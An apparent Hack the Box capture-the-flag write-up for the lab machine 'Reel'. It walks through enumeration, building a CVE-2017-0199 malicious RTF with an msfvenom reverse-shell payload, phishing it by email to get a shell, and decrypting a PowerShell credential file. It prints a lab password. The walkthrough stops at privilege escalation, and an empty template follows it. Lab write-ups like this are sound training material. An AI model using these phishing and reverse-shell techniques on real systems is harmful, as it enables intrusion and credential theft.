---
title: "Hack the Box - Reel"
slug: "hack-the-box-reel"
date: "2024-03-14"
excerpt: ""
cover: "cover.png"
tags:
  - 
---

## Summary
### System Information
```text
IP: 10.10.10.77
OS: Windows
Hostname: 
```

### Credentials
```text
tom:1ts-mag1c!!!
```

### Hashes
```text

```

### Ports
```text
21/tcp open  ftp     Microsoft ftpd
22/tcp open  ssh     OpenSSH 7.6 (protocol 2.0)
25/tcp open  smtp?
```

***

## Enumeration
### NMAP

```bash
nmap -sC -sV -v -T4 -oN scans/nmap.txt 10.10.10.77
```

```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_05-29-18  12:19AM       <DIR>          documents
| ftp-syst: 
|_  SYST: Windows_NT
22/tcp open  ssh     OpenSSH 7.6 (protocol 2.0)
| ssh-hostkey: 
|   2048 82:20:c3:bd:16:cb:a2:9c:88:87:1d:6c:15:59:ed:ed (RSA)
|   256 23:2b:b8:0a:8c:1c:f4:4d:8d:7e:5e:64:58:80:33:45 (ECDSA)
|_  256 ac:8b:de:25:1d:b7:d8:38:38:9b:9c:16:bf:f6:3f:ed (ED25519)
25/tcp open  smtp?
| smtp-commands: REEL, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, X11Probe: 
|     220 Mail Service ready
|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest: 
|     220 Mail Service ready
|     sequence of commands
|     sequence of commands
|   Hello: 
|     220 Mail Service ready
|     EHLO Invalid domain address.
|   Help: 
|     220 Mail Service ready
|     DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
|   SIPOptions: 
|     220 Mail Service ready
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|   TerminalServerCookie: 
|     220 Mail Service ready
|_    sequence of commands
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port25-TCP:V=7.92%I=7%D=8/12%Time=62F5DE75%P=x86_64-pc-linux-gnu%r(NULL
SF:,18,"220\x20Mail\x20Service\x20ready\r\n")%r(Hello,3A,"220\x20Mail\x20S
SF:ervice\x20ready\r\n501\x20EHLO\x20Invalid\x20domain\x20address\.\r\n")%
SF:r(Help,54,"220\x20Mail\x20Service\x20ready\r\n211\x20DATA\x20HELO\x20EH
SF:LO\x20MAIL\x20NOOP\x20QUIT\x20RCPT\x20RSET\x20SAML\x20TURN\x20VRFY\r\n"
SF:)%r(GenericLines,54,"220\x20Mail\x20Service\x20ready\r\n503\x20Bad\x20s
SF:equence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20commands\r
SF:\n")%r(GetRequest,54,"220\x20Mail\x20Service\x20ready\r\n503\x20Bad\x20
SF:sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20commands\
SF:r\n")%r(HTTPOptions,54,"220\x20Mail\x20Service\x20ready\r\n503\x20Bad\x
SF:20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20command
SF:s\r\n")%r(RTSPRequest,54,"220\x20Mail\x20Service\x20ready\r\n503\x20Bad
SF:\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20comma
SF:nds\r\n")%r(RPCCheck,18,"220\x20Mail\x20Service\x20ready\r\n")%r(DNSVer
SF:sionBindReqTCP,18,"220\x20Mail\x20Service\x20ready\r\n")%r(DNSStatusReq
SF:uestTCP,18,"220\x20Mail\x20Service\x20ready\r\n")%r(SSLSessionReq,18,"2
SF:20\x20Mail\x20Service\x20ready\r\n")%r(TerminalServerCookie,36,"220\x20
SF:Mail\x20Service\x20ready\r\n503\x20Bad\x20sequence\x20of\x20commands\r\
SF:n")%r(TLSSessionReq,18,"220\x20Mail\x20Service\x20ready\r\n")%r(Kerbero
SF:s,18,"220\x20Mail\x20Service\x20ready\r\n")%r(SMBProgNeg,18,"220\x20Mai
SF:l\x20Service\x20ready\r\n")%r(X11Probe,18,"220\x20Mail\x20Service\x20re
SF:ady\r\n")%r(FourOhFourRequest,54,"220\x20Mail\x20Service\x20ready\r\n50
SF:3\x20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\
SF:x20commands\r\n")%r(LPDString,18,"220\x20Mail\x20Service\x20ready\r\n")
SF:%r(LDAPSearchReq,18,"220\x20Mail\x20Service\x20ready\r\n")%r(LDAPBindRe
SF:q,18,"220\x20Mail\x20Service\x20ready\r\n")%r(SIPOptions,162,"220\x20Ma
SF:il\x20Service\x20ready\r\n503\x20Bad\x20sequence\x20of\x20commands\r\n5
SF:03\x20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of
SF:\x20commands\r\n503\x20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\
SF:x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20comman
SF:ds\r\n503\x20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequenc
SF:e\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20commands\r\n503\
SF:x20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x2
SF:0commands\r\n");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

### FTP
We have anonymous FTP access.

![](evidence/screenshots/20220812150318524.png)

There are some files in the `documents` directory. Let's download them.

![](evidence/screenshots/20220812150443242.png)

If we look at the the properties of the file we can see the username of the creator of the file.

```bash
exiftool * | grep Creator
```

![](evidence/screenshots/20220812150733492.png)

### Malicious RTF File

If we look at the `readme.txt` file, it says that files sent via email will be converted. So we need to figure out a way to execute a malicious payload in RTF files as well as figure out how to email it.

![](evidence/screenshots/20220812150844002.png)

In order to create a malicious RTF document we first need to create a payload.

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.7 LPORT=9001 -f hta-psh -o shell.hta
```

![](evidence/screenshots/20220812202643681.png)

We also need to download a script to generate our malicious document.

```bash
wget https://raw.githubusercontent.com/bhdresh/CVE-2017-0199/master/cve-2017-0199_toolkit.py
```

Then create the malicious document pointing the remote URL to our machine.

```bash
python cve-2017-0199_toolkit.py -M gen -w document.rtf -u http://10.10.16.7/shell.hta -t rtf -x 0
```

![](evidence/screenshots/20220812202749267.png)

### SMTP
Now that we've generated the malicious file, we need to send it via email. We need to figure out some valid email addresses we can use to send the email from.

We can create a simple email address list to test certain scenarios.

```text
test@test.com
test@reel.com
test@megabank.com
nico@megabank.com
```

```bash
smtp-user-enum -M RCPT -U emails.txt -t reel.htb
```

![](evidence/screenshots/20220812210651284.png)

It looks like we can use anything with `@reel.htb`. Now we can use `sendemail` to send an email to `nico@megabank.com`.

## Shell as nico
### Phishing
Let's start a `netcat` listener.

```bash
rlwrap nc -lnvp 9001
```

Then send we can the email with our RTF document as an attachment.

```bash
sendemail -f test@reel.htb -t nico@megabank.com -u "Sign Document" -m "Please sign attatched document." -a document.rtf -s reel.htb -v
```

![](evidence/screenshots/20220812211005525.png)

And we get a our shell!

![](evidence/screenshots/20220812211101705.png)

### User.txt
```bash
type user.txt && ipconfig
```

![](evidence/screenshots/20220812211249337.png)

## Pivot to Tom
### Network Credentials
On the Desktop of `nico` is a document named `cred.xml`.

![](evidence/screenshots/20220812211439040.png)

It looks like it contains an a PowerShell credential object exported as XML. We can import it and get the plaintext credentials using `ImportClixml`.

```powershell
powershell -c "$cred = Import-Clixml cred.xml; $cred.GetNetworkCredential() | Select-Object *"
```

![](evidence/screenshots/20220812220312002.png)

```text
tom:1ts-mag1c!!!
```

Now we're able to SSH in.

```bash
ssh tom@reel.htb
```

![](evidence/screenshots/20220812220417547.png)

## Privilege Escalation
On Tom's desktop is a directory `AD Audit\Bloodhound\Ingestors`. Inside is a `acls.csv` file.# reel
## Summary
### System Information
```text
IP: 
OS: 
Hostname: 
```

### Credentials
```text

```

### Hashes
```text

```

### Ports
```text

```

***

## Enumeration
### NMAP

```bash

```

```text

```
